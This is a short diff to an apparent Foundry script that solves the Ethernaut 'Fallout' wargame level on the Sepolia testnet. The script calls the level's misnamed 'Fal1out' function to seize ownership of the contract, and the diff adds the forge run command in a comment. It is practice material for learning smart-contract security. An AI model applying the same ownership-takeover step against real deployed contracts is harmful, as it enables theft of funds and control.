@@ -10,6 +10,7 @@ interface IFallout {
     function owner() external view returns (address);
 }
 
+//  forge script script/solutions/02-Fallout.s.sol:FalloutSolution --rpc-url $SEPOLIA_RPC
 contract FalloutSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639;
     uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
@@ -23,7 +24,6 @@ contract FalloutSolution is Script, EthernautHelper {
         IFallout fallout = IFallout(challengeInstance);
         fallout.Fal1out{value: 0.001 ether}();
         console2.log("New Owner is: ", fallout.owner());
-
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
